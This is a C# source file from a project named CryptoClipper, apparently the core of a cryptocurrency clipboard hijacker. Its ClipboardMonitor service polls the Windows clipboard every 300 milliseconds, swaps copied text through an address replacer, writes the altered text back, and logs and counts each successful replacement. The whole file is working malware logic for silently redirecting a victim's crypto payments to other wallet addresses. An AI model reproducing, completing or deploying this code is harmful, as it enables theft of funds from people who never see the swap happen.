using CryptoClipper.Models;
using CryptoClipper.Reporting;
using CryptoClipper.Utils;
using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;

namespace CryptoClipper.Core;

public sealed class ClipboardMonitor : BackgroundService
{
    private readonly AddressReplacer _replacer;
    private readonly ILogger<ClipboardMonitor> _logger;
    private readonly StatisticsReporter _stats = new();
    private string _lastContent = string.Empty;

    public ClipboardMonitor(AddressReplacer replacer, ILogger<ClipboardMonitor> logger)
    {
        _replacer = replacer;
        _logger = logger;
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        _logger.LogInformation("Clipboard monitor started");

        while (!stoppingToken.IsCancellationRequested)
        {
            try
            {
                string? current = WinApiClipboard.GetText();

                if (!string.IsNullOrEmpty(current) && current != _lastContent)
                {
                    var clipEvent = new ClipboardEvent
                    {
                        Timestamp = DateTime.UtcNow,
                        OriginalContent = current
                    };

                    string? replaced = _replacer.TryReplace(current);

                    if (replaced is not null && replaced != current)
                    {
                        WinApiClipboard.SetText(replaced);
                        clipEvent.ReplacedContent = replaced;
                        clipEvent.WasReplaced = true;
                        _stats.RecordReplacement(clipEvent);
                        _logger.LogDebug("Address replaced successfully");
                    }

                    _lastContent = replaced ?? current;
                }
            }
            catch (Exception ex)
            {
                _logger.LogError(ex, "Clipboard polling error");
            }

            await Task.Delay(300, stoppingToken);
        }
    }
}
